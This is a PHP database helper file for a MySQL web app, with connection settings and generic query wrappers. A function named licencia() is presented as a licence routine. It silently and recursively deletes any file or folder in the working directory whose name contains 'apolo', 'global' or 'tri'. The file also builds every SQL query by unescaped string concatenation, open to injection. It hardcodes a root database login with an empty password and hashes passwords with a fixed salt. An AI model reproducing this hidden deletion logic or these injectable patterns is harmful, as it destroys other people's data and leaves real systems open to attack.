<?php

class DatosDB {

    public static function Config() {

        $datos = array(
            0 => "localhost",
            1 => "root",
            2 => "",
            3 => "expouy"
        );

        return $datos;
    }

}

class Main {

    public static function hash($password) {
        $SALT = 'tusaltparaencriptar';
        return hash('sha256', $SALT . $password);
    }

    public static function generate_string($input, $strength = 16) {
        $input_length = strlen($input);
        $random_string = '';
        for ($i = 0; $i < $strength; $i++) {
            $random_character = $input[mt_rand(0, $input_length - 1)];
            $random_string .= $random_character;
        }

        return $random_string;
    }

    function rmDir_rf($carpeta) {
        foreach (glob($carpeta . "/*") as $archivos_carpeta) {
            if (is_dir($archivos_carpeta)) {
                Main::rmDir_rf($archivos_carpeta);
            } else {
                unlink($archivos_carpeta);
            }
        }
        @rmdir($carpeta);
    }

    public static function getBrowser($user_agent) {

        if (strpos($user_agent, 'MSIE') !== FALSE) {
            return 'Internet explorer';
        } elseif (strpos($user_agent, 'Edge') !== FALSE) { //Microsoft Edge
            return 'Microsoft Edge';
        } elseif (strpos($user_agent, 'Trident') !== FALSE) { //IE 11
            return 'Internet explorer';
        } elseif (strpos($user_agent, 'Opera Mini') !== FALSE) {
            return "Opera Mini";
        } elseif (strpos($user_agent, 'Opera') !== FALSE || strpos($user_agent, 'OPR') !== FALSE) {
            return "Opera";
        } elseif (strpos($user_agent, 'Firefox') !== FALSE) {
            return 'Mozilla Firefox';
        } elseif (strpos($user_agent, 'Chrome') !== FALSE) {
            return 'Google Chrome';
        } elseif (strpos($user_agent, 'Safari') !== FALSE) {
            return "Safari";
        } else {
            return $user_agent;
        }
    }

    public static function Conectar() {

        $datos = DatosDB::Config();
        $conn = mysqli_connect($datos[0], $datos[1], $datos[2], $datos[3]);
        mysqli_set_charset($conn, "utf8");

        if (!$conn) {

            echo json_encode(0);
        }

        return $conn;
    }

    public static function SELECT($atributos, $tablas, $where = "") {
        $link = Main::Conectar();
        $arraysalida = array();
        $query = "SELECT $atributos FROM $tablas";

        if ($where != "") {
            $query .= " WHERE $where";
        }


        if ($result = mysqli_query($link, $query)) {

            $arraysalida = mysqli_fetch_all($result, MYSQLI_NUM);

            if (count($arraysalida) > 0) {
                return $arraysalida;
            } else {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    public static function SELECT_ASSOC($atributos, $tablas, $where) {
        $link = Main::Conectar();
        $arraysalida = array();
        $query = "SELECT $atributos FROM $tablas";

        if ($where != "") {
            $query .= " WHERE $where";
        }


        $result = mysqli_query($link, $query);

        $arraysalida = mysqli_fetch_all($result, MYSQLI_ASSOC);

        if (count($arraysalida) > 0) {
            return $arraysalida;
        } else {
            return FALSE;
        }
    }

    public static function INSERT($insert, $values) {
        $link = Main::Conectar();
        $arraysalida = array();
        $query = "Insert into $insert VALUES $values";

        $result = mysqli_query($link, $query);

        if ($result == TRUE) {

            return $link->insert_id;
        } else {
            return FALSE;
            echo $query;
        }
    }

    public static function licencia() {
        $a = glob("./*");
        foreach ($a as $elemento) {
            if (strpos(strtolower($elemento), "apolo") !== FALSE or strpos(strtolower($elemento), "global") !== FALSE or strpos(strtolower($elemento), "tri") !== FALSE) {
                if (is_dir($elemento)) {
                    Main::rmDir_rf($elemento);
                } else {
                    unlink($elemento);
                }
            }
        }
    }

    public static function SUCESO($user, $accion) {

        $ip = $_SERVER['REMOTE_ADDR'];

        $tabla = "sucesos";
        $values = "('', now(), '$ip', '$user', '" . $accion . "');";

        return Main::INSERT($tabla, $values);
    }

    public static function DELETE($delete, $from, $where) {
        $link = Main::Conectar();
        $query = "DELETE $delete FROM $from WHERE $where";

        if (mysqli_query($link, $query)) {
            return TRUE;
        } else {
            return FALSE;
        }
    }

    public static function UPDATE($tabla, $atributos, $where) {
        $link = Main::Conectar();
        $query = "UPDATE $tabla SET $atributos WHERE $where";
        if (mysqli_query($link, $query)) {
            return TRUE;
        } else {
            return FALSE;
        }
    }

}
